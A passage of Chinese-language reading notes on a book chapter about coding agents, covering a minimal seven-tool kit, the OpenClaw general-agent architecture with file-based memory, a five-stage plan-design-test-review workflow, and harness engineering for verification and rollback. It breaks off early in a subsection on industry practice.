> 本笔记对应原书《深入理解AI Agent：设计原理与工程实践》第 5 章「Coding Agent 与通用 Agent」，原书印刷页码 122–153 页（PDF 第 130–161 页）。

前四章分别拆开了上下文工程（第二、三章）和工具设计（第四章），这一章要把这些构件装回一个整体，回答通用 Agent 的架构究竟长什么样。原书给的答案是：以开放任务为目标的通用 Agent，内核是一个 Coding Agent 加一个文件系统，文件系统负责存放代码、数据、记忆和中间结果，用法和程序员在电脑上用文件夹管理项目差不多；从 Manus 到 OpenClaw，成功的开放任务型产品都走这条路。代码生成之所以能当这个内核，是因为它是通用性最强的元能力，能在运行时造出新工具和新能力。5.1 讲怎么把这个内核造得可靠，从基础能力、OpenClaw 案例、整体流程，一路走到 Harness 工程、故障恢复、实现技巧，以及搜索工具和文件编辑工具这两个最关键的专用件，最后落在安全上。5.2 讲这项元能力在编程之外的六个方向，按「作用对象」由内向外排开，从思维本身一直推到 Agent 自身；5.3 是本章小结。全章有两条线要一直拎着：可验证性决定成熟度，以及代码是 Agent 做形式化思考和精确表达的语言。原书在本章末尾交代了后续走向，前五章都默认 Agent 与世界轮流行动，第六章把观察与动作空间扩到异步事件、语音、屏幕和物理世界，第七章转向评估与持续改进。

## 5.1 Coding Agent

这一节是本章前半部分的总起，原文用几段话把整章的论点先立住了。它先立论：以开放任务为目标的通用 Agent，核心是一个 Coding Agent 加上文件系统。文件系统在这里的位置比普通工具重得多，它是 Agent 用来存储代码、数据、记忆和中间结果的工作空间，像程序员用文件夹管理项目那样。接着给理由：代码生成是一种元能力，能在运行时动态创造出新的工具和能力，所以它担得起主干这个位置，本章后半部分 5.2 会把这一概念和它的六个应用方向完整展开。最后是两层价值证成，思考上形式化代码让推理高度严谨，「年龄大于 18 且已实名认证」用自然语言描述可能有多种理解，写成代码就毫无歧义；表达上一段能跑通的代码本身就是逻辑自洽的证明，执行结果提供了客观的对错标准。本章后面的内容要么在讲怎么把这个内核造可靠（5.1），要么在讲这个元能力还能用到哪些地方（5.2）。

「文件系统」为什么必须和 Coding Agent 并列，值得单独想一下。因为文件是 Agent 的外部记忆和交互协议：它既是代码和数据的落点，也是多个工具之间传递中间结果的公共总线，同时还是人类能直接读懂、直接修改的接口。少了它，代码写出来没地方放，下次会话就找不到，人也没法介入审查。这一点在 5.1.2 讲 OpenClaw 的文件系统时会展开。

「元能力」这个词也要先立住。普通能力说的是「能干某件具体的事」，元能力说的是「能创造出新的能力」。区别的工程后果相当大：Agent 如果只有固定工具集，能力边界在部署那一刻就被钉死了；会写代码的 Agent，能力边界可以在运行时继续往前推。5.2 的六个方向，其实就是这句话的六种具体兑现方式。结构上，原文说明本章先从 Coding Agent 的基础能力和通用 Agent 架构（OpenClaw）讲起，然后展示代码生成在各类场景中的应用，从数学思考、内容创作一直到系统级的元能力。

### 5.1.1 Coding 是 Agent 的基础能力

原文的核心论断是：代码生成并不专属于少数专门化 Agent，它是每个通用 Agent 都该具备的基础能力；而且在当前 SOTA 模型的加持下，具备基本 coding 能力并不需要复杂的架构。

论证用的任务很典型：「整理仓库中所有遗留的 TODO 注释，按优先级分类并生成 issue」。完成这件事需要浏览目录结构（ls/glob）、读取代码（read）、修改文件（edit/write）、运行命令（bash）、查找模式（grep/search），原文指出这五类操作覆盖了几乎所有 Coding Agent 的核心动作。为了支持它们，一个基础的 Coding Agent 只需配备七个核心工具：

1. Code Interpreter（代码解释器）：提供隔离的沙盒环境（sandbox，即与主系统隔离的安全运行空间，代码即使在其中运行出错也不会影响宿主机），安全执行 Python 代码。
2. Bash Shell（命令行终端）：在终端中执行命令，比如运行测试用例、处理特殊格式文件。
3. 读文件工具：读取代码、配置、文档、日志等。
4. 写文件工具：创建新文件或完全重写现有文件。
5. 编辑文件工具：对现有文件进行局部修改，是代码维护和迭代的核心操作。
6. 搜索文件名工具（Glob）：通过模式匹配快速定位文件系统中的目标文件，例如用 `**/*.py` 找出项目中所有 Python 文件。
7. 搜索文件内容工具（Grep）：在文件内容中搜索特定的文本模式，例如搜索所有调用了某个函数的代码行。

这七个工具构成一个完整但极简的工具箱，几乎任何 Agent 系统都能低成本集成。原文特意提醒一条边界：这套配置是 Coding Agent 特有的基础配置，不同于第四章按调用方向和作用性质划分的五类通用工具（感知、执行、协作、事件触发、用户沟通）。七个工具主要覆盖了感知和执行两类；协作、事件触发、用户沟通这三类需求仍然需要别的工具，但它们不属于 Coding Agent 的核心。

接着原文用最小的任务把这些工具串了一遍。假设用户说「帮我把项目里所有 TODO 注释整理成一个清单」：

```
Agent（思考）：需要找到所有包含 TODO 的代码行。
Agent → Grep("TODO", glob="**/*.py")        # 搜索文件内容
工具返回：
  src/api.py:42:        # TODO: add rate limiting
  src/db.py:15:         # TODO: migrate to PostgreSQL
  tests/test_api.py:8:  # TODO: add edge case tests
Agent（思考）：找到了 3 个 TODO，整理成清单写入文件。
Agent → Write("TODO_LIST.md", content="...") # 写文件
工具返回：文件已创建
Agent：已整理完毕，共发现 3 个 TODO 项，清单保存在 TODO_LIST.md。
```

整个过程只用了 Grep 和 Write 两个工具。任务再复杂一点，比如「统计每个模块的 TODO 数量并画个柱状图」，Agent 会再拉上 Code Interpreter 执行 Python 代码做统计和绘图。七个工具虽然简单，组合起来能完成的任务却非常多样。

读者必然会问：为什么是七个，不是六个？原文承认，事实上一个 Bash Shell 工具就能覆盖大部分操作。OpenAI Codex 的工具集就极为精简，它以 shell 作为唯一的通用执行入口，用命令完成目录浏览、文件查找与读取；文件修改则交给一个语法受约束的 `apply_patch` 工具，把编辑表达成结构化补丁，而不是自由文本命令，从而降低改错文件的概率。另一些 Agent 仍然保留单独的文件读写工具。本书列七个，是为了方便读者理解 Coding Agent 所需的基本能力。

最后一个问题：为什么每个通用 Agent 都该具备 coding 能力？因为代码生成不只是写程序，它是一种通用的问题解决手段。原文列了四种场景：遇到数学推理，可以写段代码交给求解器算出精确答案；需要固化业务规则，代码比自然语言描述精确得多；缺少某个工具，可以临时写一个；数据格式变了，动态生成解析逻辑。这些都是本章后续要展开的内容。原文的收束句是：一个具备基本 coding 能力的 Agent，即使工具箱里只有上述七个简单工具，也能在遇到新需求时动态扩展自己的能力边界。

这一节真正值得记的是「五个动作到七个工具」的映射，七个工具的名字反倒次要。原文先归纳出五类动作，再为它们配工具，这个顺序说明工具是从必要动作推出来的。以后给任何领域的 Agent 设计工具集，都可以照这个思路走一遍：先列出完成这类任务必须做哪几种动作，再考虑每种动作用一个还是多个工具承载。

读写编辑为什么拆成三个工具，而不是合成一个「文件操作」？因为它们的失败模式和安全语义完全不同。读文件是纯感知，永远不会破坏状态，可以放心并行、放心重试；写文件是整体覆盖，会毁掉原有内容，必须谨慎；编辑文件是局部替换，是日常迭代的主力，但对定位精度最敏感。三者分开，模型调用时的心理负担更小，Harness 也能对它们施加不同的权限与校验策略，比如只读挂载、写前审批。这也解释了 5.1.8 为什么要用一整节专门讨论编辑工具的表达方式。

关于 Code Interpreter 的定义，要抓住括号里的两个词：隔离，崩溃、死循环、资源耗尽可能被限制在沙盒内；安全运行空间，默认不该有逃逸出去的权限。它和 Bash Shell 的分工也要分清，Code Interpreter 面向「用 Python 做计算和数据加工」，Bash Shell 面向「和操作系统、构建工具、测试框架打交道」。原文举的例子正好体现这个分工，「运行测试用例」归 Bash，「统计和绘图」归 Code Interpreter。

「一个 Bash 就能覆盖大部分操作」这个反例，教的其实是判断工具粒度的原则：粒度取决于你想在哪一层做约束和校验。Codex 选 shell 作唯一入口，代价是模型要自己拼命令行、更容易出错，收益是执行面极小、极易沙盒化；`apply_patch` 之所以被单独做成结构化工具，恰恰因为自由文本改文件太容易改错，需要在工具层用语法兜底。工具多和工具少没有绝对优劣，关键看约束放在哪里。

七个工具只覆盖感知和执行两类，这个观察能帮你对齐第四章的分类法：Coding Agent 的工具箱是任务执行取向的，它天然不解决「和谁协作」「被谁唤醒」「怎么通知用户」。所以真实的通用 Agent 产品（比如 5.1.2 的 OpenClaw）一定还要在七个工具之外加上消息网关、事件触发、子 Agent 协作这些部件。原文说它们「不是 Coding Agent 的核心」，不等于不需要。

### 5.1.2 案例：从 Manus 到 OpenClaw——通用 Agent 的 Coding 内核

原文先立场景：以 Manus、OpenClaw 为代表的通用 Agent 产品，把 Deep Research（深度调研）、Computer Use（电脑操控）和 Coding（代码生成）三大能力融合在一个系统中。于是自然产生一个问题，为什么本章开头说 Coding Agent 是其中的核心，而不是另外两者？

原文的回答是：几乎所有高效的内容生成最终都要落到代码上。逐项举证如下。PPT、Word 文档本质上是 OOXML（Office Open XML，微软推出的办公文档开放标准）格式的代码。PDF 报告可以通过 Markdown、HTML 或 LaTeX 生成，数据分析和可视化可以由 Python 脚本完成。甚至 GUI 操作中成功的浏览器操作序列也可以被固化为可复用的代码（详见第九章）。Deep Research 的搜索和信息综合可通过代码驱动的 Web 请求和解析实现。Computer Use 虽然通用性更强，但成本、延迟和稳定性远不如直接通过代码或 API 来完成相同操作。结论句是：代码生成是效率最高、成本最低、可复用性最强的能力基座。

图 5-1（原文插图，题为「OpenClaw 架构中的 Coding Agent 核心」）画的是 OpenClaw 的分层结构，从图中可读出的信息如下：

- 最上层是多平台消息网关（用户交互层），列出的渠道有 WhatsApp、Telegram、iMessage、Slack、CLI；它向下输出「自然语言请求」。
- 中间是 Coding Agent 运行时（推理 + 执行核心），里面并排放着七个工具及其职责：Code Interpreter（代码执行）、Bash Shell（系统命令）、Read File（读取文件）、Write File（写入文件）、Edit File（编辑文件）、Glob（文件搜索）、Grep（内容搜索）。紧挨着它有两个外侧模块：网络搜索模块（对应 Deep Research 的「Web 请求 · 解析」）与浏览器自动化（对应 Computer Use 的「Playwright DOM」）。
- 下层是文件系统（记忆 · 知识 · 能力中枢），其中列出了：MEMORY.md（高层级事实 / 用户偏好）、`daily/YYYY-MM-DD.md`（按日归档 / 交互日志）、SOUL.md（Agent 身份与行为规则）、知识库文件（任务经验 / 自我进化）、Git 版本控制（记忆回滚 / 历史审计）。
- 图的底部写着一句总结：「大模型 = 新操作系统：屏蔽智能复杂性，提供统一抽象」；运行时的七个工具与文件系统之间是「读 / 写文件」的双向关系。

原文接着给了一条具体执行流来理解这个架构。假设用户要求「Help me analyze last quarter's sales data and create a summary report」：

| 步骤 | 动作 | 内容 |
| --- | --- | --- |
| 1 | 读记忆 | Agent 读取 MEMORY.md，发现用户偏好 PDF 格式的报告，数据源是 Google Sheets |
| 2 | 调工具 | 通过网络搜索模块获取 Google Sheets API 的使用方法，通过代码执行下载数据 |
| 3 | 写代码 | 用 Python 生成数据分析脚本（pandas 聚合、matplotlib 可视化） |
| 4 | 生成产物 | 将分析结果写入 report.pdf，图表写入 charts/ 目录 |
| 5 | 更新记忆 | 在 MEMORY.md 中记录「User's sales data is in Google Sheets, ID: xxx」，下次无需再问 |

原文对这个过程的点评是：整个过程中，文件系统是信息流转的枢纽，记忆从文件读取，产物写入文件，经验也保存为文件。

文件系统作为 Agent 的中枢，这一点原文说得很明确：在 OpenClaw 的设计中，它远不止是数据存储，同时是 Agent 记忆、知识和能力的中枢。Agent 的长期记忆存储在 MEMORY.md（高层级事实和用户偏好）和按日期归档的 Markdown 日志中。

原文还专门辩护了一个看似反直觉的决定：选择 Markdown 而非向量数据库。原话说这个决定「看似反直觉，实际上极其有效」，理由有三条。用户可以直接打开文件阅读和修改 Agent 的记忆，如果 Agent 记错了某件事，直接删掉那一行就行；Markdown 天然保留时间顺序，避免语义检索中的时间混淆；而且可通过 Git 做版本控制和回滚。

更关键的是，Agent 拥有写文件的能力，这意味着它具备了修改自身外部产物的技术条件。原文举了个例子：Agent 首次执行某个任务并发现了之前不知道的关键信息（比如给某银行打电话时，发现对方要求提供开户行地址才能验证身份），它可以先把发现写进记录。这里有一个重要保留：记录何时足以成为可靠知识、指令或程序，仍需结合更多轨迹与结果验证，这是第九章要讨论的持续进化问题。

适用边界这一段，原文对「Coding Agent 是通用 Agent 的核心」做了明确限定：

- 这一判断主要适用于以开放任务为目标的通用 Agent，也就是深度调研、内容生成、数据处理这类任务边界不确定、产物形态多样的场景。这些场景里没法预先枚举所有需要的工具，代码生成作为元能力提供了动态扩展能力边界的最经济路径，所以它是架构的核心。
- 另一类 Agent 比如垂直领域的客服 Agent，任务空间相对封闭，核心架构围绕固定的业务流程、领域工具和对话策略构建，代码在其中更多是工具箱里的一件工具，而不是架构中枢。
- 但即便在后者，原文也强调 coding 仍是重要的基础能力，精确计算、数据处理、规则校验都离不开它。

这一节的论证方式值得学。它绕开了「Coding 更强」这种直说，把三大能力各自的最终产物都还原成代码：PPT/Word 是 OOXML 代码，PDF 报告可以由 Markdown/HTML/LaTeX 生成，数据分析和可视化是 Python 脚本，浏览器操作序列能被固化成可复用代码，Deep Research 的抓取与解析也是代码。既然大家都以代码为落点，代码生成自然就是更底层的那一层，「基座」说的就是这个位置。这是一种向下归约式的论证：谁能实现谁，谁就是基础。

Computer Use 明明更通用，为什么排不到核心？原文给的是三个工程指标：成本、延迟、稳定性。它的每一次操作都要让模型看屏、思考、移动鼠标、点击，每一步都可能出错且几乎不可复现；同一件事写成代码或调 API，一次写对就能无限次稳定重放。通用性买的是覆盖面，代码买的是单位成本。对一个要跑成千上万次任务的通用 Agent 来说，单位成本才是决定性的。原文 5.2.4 会把这条逻辑推到底：没有 API 的系统，也先用 Computer Use 跑通一次，再把成功的操作序列固化成 RPA 代码。

文件系统为什么能当中枢，而不是数据库？「中枢」这个词要求三件事同时成立：信息能存（记忆）、能被 Agent 自己改（能力）、能被人类审阅和修正（知识）。传统数据库能满足第一条，但人类很难打开一张 PostgreSQL 表去检查「Agent 是不是把我的偏好记错了」。Markdown 文件的妙处在于，它是人类可读可编辑的纯文本，同时又是程序能精确解析的结构化格式，两边都能用。再叠加 Git，就免费获得了版本、diff、回滚和历史审计。这是一次具体的工程取舍：牺牲检索效率，换取可审计性和可修正性。

原文关于「时间混淆」的那半句可以再展开一点。语义检索（向量检索）返回的是按相似度排序的片段，相似度高的两条记忆可能一条来自去年、一条来自昨天，模型看不出先后；而按日期归档的 Markdown 日志按时间顺序线性排列，时间关系一眼可见。对「用户上个月说要 A，这个月改口说要 B」这类需要时序判断的场景，这个差别是致命的。

「Agent 能写自己的记忆文件」这件事的分量，原文用「技术条件」四个字限定住了：能写不等于该信。紧接着补的那句「记录何时足以成为可靠知识、指令或程序，仍需结合更多轨迹与结果验证」，是一个很克制的表述，把「记下来」和「变成知识」明确拆成两步。写文件解决的是信息不丢，持续进化要解决的是信息可信，后者留给了第九章。

适用边界那一段是本节最容易被忽略、实际却最重要的部分。它把一句口号收窄成一个有前提条件的判断：只对开放任务型 Agent 成立。判据是任务空间能不能预先枚举。能枚举（垂直客服），就把固定业务流程和领域工具做成架构，代码只是普通工具；不能枚举（深度调研、内容生成、数据处理），就必须靠代码动态补能力，代码自然升格为中枢。不过还要记住原文的最后一层转折：即便在封闭场景里，coding 也是重要的基础能力，精确计算、数据处理、规则校验离不开它。所以这个边界限定管的是「Coding 是不是架构中枢」，不管「要不要给 Agent coding 能力」。

容易混的是这几对。Coding Agent 能力与 Coding Agent 核心是两个判断：所有通用 Agent（包括垂直客服）都该具备 coding 能力，但只有开放任务型 Agent 才把 Coding 当架构核心，这两句话不矛盾，别混着引用。文件系统作为存储与作为中枢也不一样，前者只回答「数据放哪儿」，后者包含记忆的读写、知识库的沉淀、能力的载体、版本的回滚和人类介入的接口，原文用「远不止是数据存储」提示这个区别。还有 Manus/OpenClaw 的三大能力与本章的两大部分：三大能力（Deep Research、Computer Use、Coding）是产品层面的能力划分，本章的两大部分（5.1 造一个可靠的 Coding Agent、5.2 代码作为元能力的六个方向）是架构与机制层面的划分。图 5-1 里网络搜索模块和浏览器自动化是两个挂在 Coding Agent 运行时旁边的模块，正说明产品能力是建在 Coding 内核之上的。

一句话收束：三大能力最终都要落到代码上，所以 Coding 是基座；而文件系统是这座基座的中枢，它既是记忆，也是 Agent 能改写自身外部产物的技术条件。

### 5.1.3 Coding Agent 的整体流程

原文先给出整幅流程图。图 5-2（原文插图，题为「Coding Agent 工作流程」）把工作流画成五个阶段，每个阶段里列出了具体动作与所用工具，并在图的下半部分单独画出闭环反馈机制与 Agent 状态栏。按图可读出的内容如下：

| 阶段 | 图中的动作与工具 |
| --- | --- |
| ① 项目文档化 | `read_file` 读 README.md、ARCHITECTURE.md；`glob` 匹配 `**/*.py`、`**/*.ts`；`write_file` → 生成 CLAUDE.md 项目指南 |
| ② 需求理解 | `ask_user` 询问「优化目标是延迟还是吞吐？」；`grep` 搜 `latency\|throughput` 于 `src/`；`read_file` 读 `src/config.py`（当前参数） |
| ③ 设计文档 | `write_file` 写 design.md（方案对比）；`ask_user` 提交设计 → 等待审批 |
| ④ 编码与测试 | `edit_file` 以 `old_str→new_str` 修改代码；`bash` 运行 `pytest tests/ -v`；`edit_file` 修复失败测试 → 重跑 |
| ⑤ 审查与交付 | `bash` 运行 `ruff check src/`（lint）；`read_file` 自审：可读性/安全/性能；`edit_file` 更新 ARCHITECTURE.md |

图中还标出了三类闭环反馈：

- 测试失败 → 修改代码 → 重新测试，标注为「④ 内循环：平均 2-3 轮收敛」；
- Lint 错误 → 即时修复 → 再检查，标注为「⑤ 内循环：编辑后自动触发」；
- 审查发现问题 → 回到 ④ 修改，标注为「⑤→④ 回退：保证交付质量」。

图右侧还列了 Coding Agent 的运行环境要求：Agent 状态栏（cwd, git branch）、Agent 状态栏（未暂存变更）、工具输出（头尾截断）、持久化终端会话。图的底部是全流程的三条原则：「计划先于行动 · 验证贯穿始终 · 文档与代码共同演化」。原文接着按阶段逐段展开。

#### 项目文档化

Coding Agent 的工作始于对项目的系统性理解。首次接触一个代码仓库时，首要任务是先建立对整个项目的认知框架，别急着动手改代码。原文打了个比方：就像一位新入职的工程师，第一天先去熟悉项目结构，不会直接提交代码。Agent 会先确认项目是否存在文档。如果关键文档缺失，盲目开工是不可接受的，它应当主动承担文档化的责任，通过系统性阅读代码库，识别主要模块、核心抽象、组件间依赖关系，生成包含架构概览、目录结构、测试运行指南的初始文档。这份文档既为 Agent 后续工作提供蓝图，也为其他开发者提供入门指引。原文由此引出关键原则：知识的显式化是高效协作的前提。

项目文档化如今有了一种 Agent 专用的形态：项目指令文件。CLAUDE.md、AGENTS.md、`.cursorrules` 等文件已成为业界事实标准，它们在每次会话开始时被自动注入上下文，相当于项目级的系统提示词。与面向人类读者的 README 不同，指令文件承载的是面向 Agent 的行为约定：构建与测试命令（「用 pnpm test 而不是 npm test」）、代码风格（「禁用 any 类型」）、明确的禁区（「不要改动 migrations/ 目录」）。原文把这一形态与 OpenClaw 的两个文件对齐：这与 SOUL.md（定义 Agent 的身份与行为规则）、MEMORY.md（沉淀跨会话经验）是同一思路在不同层面的应用，SOUL.md 约定「Agent 是谁」，项目指令文件约定「在这个项目里该怎么干活」。从第二章上下文工程的角度看，指令文件还是最经济的稳定前缀：内容不随任务变化，天然对 KV Cache 友好；它也是「知识必须存在于代码库本身」原则最直接的落地。

原文最后把这一节接到第二章的判断上：这也正是「对远程工作友好的团队往往也对 AI Agent 友好」那条判断在代码库层面的落点，决策记录在文档里，上下文写在 issue 和 PR 描述里，内部经验沉淀在开发者指南里，Agent 才读得到。由此原文给出了一个评估团队「AI-ready」程度的简单指标：一个远程新人只靠代码仓库和文档，能不能独立开展工作。

#### 任务理解与需求澄清

对于边界清晰、影响范围有限的简单需求，例如修正一个已知的 bug、调整某个函数的参数，Agent 可以直接进入实现阶段。但软件开发中的大多数任务并非如此简单，复杂需求面前 Agent 必须更谨慎、更有条理。原文把复杂性的来源拆成三个维度：需求本身的模糊性（用户知道想要什么但无法精确表达）；实现路径的多样性（多种技术方案可选，各有权衡）；影响范围的广泛性（需修改多个模块，可能破坏现有功能）。

Agent 应通过探索性调研来澄清边界，必要时主动与用户对话。原文举例：当用户要求「优化系统性能」时，Agent 需要先搞清楚优化的具体目标是什么（降低响应时间、减少内存占用还是提高吞吐量）、可接受的权衡是什么（是否允许修改接口、是否允许降低用户易用性）、以及当前瓶颈在哪里。原文的警告是：在需求模糊的状态下就开始编码，往往导致大量返工。

#### 编写设计文档

设计文档是将抽象需求转化为具体实现计划的桥梁，应回答四个核心问题：修改哪些模块及原因，采用什么方案及其相对优势，需引入哪些新依赖，预期对系统的影响。编写设计文档本身迫使 Agent 深度思考，在投入大量编码前先在概念层面验证方案可行性。更重要的是，设计文档为人类提供了高效的介入点，审查一份简洁的设计文档比审查数百行代码容易得多。因此 Agent 完成设计文档后应提交给用户审查，等待批准后再继续。

#### 代码实现与测试

获得设计批准后，Agent 遵循项目代码规范进行实现，复用现有抽象和工具，必要时进行适度重构以保持代码库健康。实现完成后立即进入测试驱动的质量保障环节：为新增或修改的功能编写测试用例，覆盖正常路径、边界条件和异常情况；写完测试后执行测试套件。如果测试失败，Agent 不应简单地向用户报告失败，而应分析原因、定位问题、修改代码，直到所有测试通过。

原文对这个「测试-修复」循环给了两句评价。一是正是这种自我纠错能力将 Coding Agent 从代码生成器提升为可靠的工程助手；反过来，Coding Agent 最常见的偷懒方式就是跳过这一环节，写完代码不跑测试就报告「任务完成」。原文由此点出完成标准的定义问题：把「测试通过」而非「代码写完」定义为完成标准，正是 Loop 工程「由验证判定何时可以停」原则在编码场景的落地。

即使所有测试通过，Agent 的工作也还没结束。接下来是代码审查阶段，Agent 对自己生成的代码进行批判性审视：可读性如何，是否有足够注释；是否存在潜在的性能问题或安全漏洞；是否遵循项目的代码风格和最佳实践。这个自我审查可以通过阅读代码、运行 lint 工具或调用专门的代码审查子 Agent（Sub-Agent）来实现。如果审查发现问题，应回到修改阶段完善，而不是将有缺陷的代码交付给用户。

#### 文档同步与交付

如果代码修改涉及架构层面的变化，例如引入新模块、改变模块间依赖关系、修改核心抽象语义，Agent 需相应更新架构文档。原文的判据句是：过时的文档比没有文档更糟糕，因为它会误导未来的开发者。通过在每次重要修改后自动更新文档，Agent 帮助维护了项目知识库的完整性和时效性。原文总结说，这套流程体现了软件工程的核心原则：计划先于行动，验证贯穿始终，文档与代码共同演化。

原文最后做了两点限定。流程要按需裁剪，上面介绍的是推荐的工程化流程，现实中的 Coding Agent（如 Claude Code、Codex）会按需裁剪，简单 bug 修复任务会跳过生成设计文档，只有任务复杂、影响面大时才完整走完各阶段。不同模型裁剪这套流程的方式也不相同：有些 Coding 模型会在第一次修改前广泛阅读目录、实现、调用方和测试；另一些则只读少数最可能相关的文件，马上提交一个补丁，再把编译与测试反馈当作调查的一部分。原文强调这种行为的稳定性：更换 Harness 后，「何时停止收集信息、开始行动」的阈值仍可能随模型保持不变；而在同一个 Harness 中切换模型时，阈值也可能随之改变。因此它主要是模型学到的行为策略，不完全算 Coding 产品的界面风格。Harness 的提示词、工具和预算仍能放大或抑制它，但不必是它的来源。第七章将在固定 Harness 中衡量这一差异，第八章再从后训练角度解释它可能如何写入参数。

这五步流程看成「在每一步上把人类工程师的介入点搬到最便宜的位置」，会清楚很多。项目文档化阶段，介入成本最高的是不理解项目就开始改代码，所以要先读、先写文档；需求理解阶段，最贵的错误是做错方向，所以要主动 `ask_user`；设计文档阶段，最便宜的人类审查点是那份几十行的设计文档，所以要在写代码前卡一道审批；编码测试阶段，最便宜的质量保证是自动化测试；交付阶段最容易埋雷的是文档和代码不一致，所以要同步更新文档。每一步都在用更便宜的手段替代更昂贵的返工。

`ask_user` 在流程里出现两次（②需求理解和③设计文档），这不是巧合。它的位置说明这条流程带着人机协商的性质，算不上全自动流水线：Agent 在信息不足时提问，在方案定型时请示。这也解释了为什么它对人「在不在线」很敏感。如果用户不在，`ask_user` 就会挂住，所以第六章的异步运行时才要专门处理这类情况。

项目指令文件是「最经济的稳定前缀」，这是第二、三章 KV Cache 概念的直接应用。系统提示词按「先稳定、后变化」的顺序拼接，稳定前缀能被缓存复用，只有尾部变化的部分需要重算。指令文件的内容不随任务变化，天然坐在提示词最前面，所以最经济。反过来，如果把「当前 git 分支」这类每次都变的信息硬写进静态系统提示词，就会把整个前缀的缓存打掉，这正是 5.1.6 要强调「环境信息必须动态注入」的原因。

「一个远程新人只靠代码仓库和文档，能不能独立开展工作」这个指标，妙在可操作且可验证。它避开了「我们的文档写得好不好」这种无法证伪的问法，转而设计一个具体实验：找一个没有任何口头传承可依赖的人，只给他仓库和文档，看他要多久能独立改一个 bug。远程团队对这个检验特别敏感，因为他们本来就没有「工位旁边问一句」的通道，凡是远程团队不得不写下来的东西，恰好就是 Agent 需要读到的东西。

「把测试通过而非代码写完定义为完成标准」这句话，对应一个非常具体的失败模式。模型生成长文本时有一种倾向于收尾的惯性，只要它认为自己的输出看起来完整，就会宣布任务完成。如果 Harness 把「模型说完了」当成终止信号，Agent 就会系统性地在没验证的时候停下。把终止信号改成「测试全绿的客观事实」，等于把「何时可以停」的决定权从模型的自我感觉转移到可观测的外部状态上。这也是 5.1.5 讲「终止条件」和 5.1.4 讲「验收基线」的同一个根。

审查发现问题为什么回到 ④ 而不是回到 ③？因为审查阶段的问题通常是实现层面的，可读性、性能、遗漏的边界，此时设计本身仍被认可，重走设计评审只会浪费人类注意力。只有当问题暴露了设计缺陷，比如方案本身不可行，才值得退回 ③。流程图里只画了「⑤→④ 回退」，说明原文默认绝大多数审查问题都是实现级问题。

最后那个「不同模型裁剪流程的方式不同」的观察，是本章里少见的把 Harness 与模型分离的讨论。它说的是，有一部分行为（读多少文件才肯动手）跟着模型走，而不是跟着产品走：同一个 Harness 换模型，阈值会变；跨 Harness 用同一个模型，阈值反而可能不变。实践含义是，如果你发现换了一个 Harness 之后 Agent 还是「读两下就动手」，别急着调提示词，先怀疑是模型本身的后训练策略在起作用。原文明确说 Harness 的三样东西（提示词、工具、预算）能放大或抑制它，但不必是它的来源，这是一个很克制的因果判断，也是第七章要专门做消融实验去测的对象。

这一节还有几对容易混的地方。README 与项目指令文件（CLAUDE.md/AGENTS.md/.cursorrules）都是仓库里的文档，但读者不同：README 面向人类，指令文件面向 Agent，承载的是行为约定（构建测试命令、代码风格、禁止改动的目录），并且会被自动注入每次会话的上下文，相当于项目级系统提示词，原文把后者的定位类比为 OpenClaw 的 SOUL.md。设计文档的审查与代码审查也不一样，前者发生在写代码之前，目的是在概念层面验证方案可行性，成本低（几十行对数百行）；后者发生在实现之后，管的是可读性、性能、安全、风格。两者的价值都在于给人类一个高效的介入点，但介入时机和介入成本完全不同。`bash` 跑测试和跑 lint 都通过 Bash 执行，语义却不同：测试回答「功能对不对」，属于验收基线；lint 回答「写法规不规范」，属于反馈信号，而且原文在 5.1.6 会明确说 lint 应当在文件写入后即时自动触发，不必等用户要求。测试失败后的重试与需求模糊时的返工也要分开，前者是方向对、实现错，代价是一到几轮内循环（图 5-2 标注平均 2-3 轮收敛）；后者是方向本身错了，代价是整段工作推倒重来。原文用「往往导致大量返工」强调后者的严重性，这也是流程要把澄清放在前面的原因。

五步流程（文档化→澄清→设计→编码测试→审查交付）的本质是「把人类介入点搬到最便宜的位置」，而完成标准必须由验证判定，不能由模型自己宣布。

### 5.1.4 Harness 工程在 Coding Agent 中的实践

第一章引入了 Harness 工程的概念和 Agent = Model + Harness 的公式。这里的 Harness 包含了核心公式中的上下文和工具，以及约束、验证和纠正机制，五者共同构成第一章定义的 Harness。原文的论断是，Coding Agent 可能是最能受益于 Harness 工程的领域，因为代码编写是所有 Agent 任务中可验证性最高的一类，约束、验证和纠正都有现成的基础设施可以依托。

本节给出的中心判断是：能不能稳定运行，往往不取决于用了多强的模型，而取决于围绕 Agent 搭建的基础设施有多扎实。第一章把 Harness 分成两个层面，上下文与工具让 Agent 能做事，约束、验证与纠正让 Agent 不做错事。在 Coding Agent 这个场景下，它们落地为四类具体的工程组件：

| 组件 | 回答的问题 | Coding Agent 场景下的具体形态 |
| --- | --- | --- |
| 验收基线 | 什么算做完了 | 测试套件、CI 管道（持续集成流水线，代码提交后自动运行的一系列检查）、代码审查标准 |
| 执行边界 | Agent 能碰什么不能碰什么 | 模块边界、依赖规则、权限控制 |
| 反馈信号 | 自动化的对错判断 | Linter（代码规范检查工具，能自动发现格式错误和潜在问题）输出、测试结果、类型检查错误 |
| 回退手段 | 出了问题怎么恢复 | Git 版本控制、沙盒隔离、快照回滚 |

Coding Agent 为什么特别适合 Harness 工程？原文给了一个二维框架：用任务清晰度和验证自动化程度两个维度，可以把任务分成四种状态。目标明确且结果可自动验证，是最适合 Agent 发挥的区域；目标清楚但验收还得靠人盯，吞吐量的天花板就是人的审查速度；有自动化反馈但目标模糊，系统会高效地往错误方向跑；两者都缺，Agent 基本派不上用场。表 5-1 展示了这四种状态（表格按原文语义还原）：

| | 结果可自动验证 | 结果需人工验证 |
| --- | --- | --- |
| **目标明确** | 最佳区域：修复有测试用例的 bug | 吞吐量受限：代码重构需人工审查 |
| **目标模糊** | 高效地跑偏：用 linter 优化「代码质量」 | 难以启动：「让 UI 更好看」 |

表 5-1 的用法是：Harness 的目标就是把尽可能多的任务推向「目标明确 + 验证自动化」这个象限。代码编写为什么天然处在这个象限的核心？原文列了三条支撑：测试套件提供明确的验收标准，Linter 和类型检查器提供即时的自动化验证，Git 提供完美的版本控制和回退能力。由此得出本节最核心的结论：Coding Agent 是当前所有 Agent 类型中成熟度最高的，代码生成模型未必特别强，真正的支撑是软件工程几十年积累的基础设施，它们天然构成了一套强大的 Harness。

#### 业界实践

原文给了三个案例，说明它们如何印证上述原则。

一家大型科技公司公开分享过大规模代码迁移的实践。原文的点评是关键不在模型强，而在 Harness 做对了三件事：知识必须存在于代码库本身（Agent 看不到的等于不存在）、约束编码进 Linter 和 CI 而非写在文档里、验证和纠正全链路自动化。

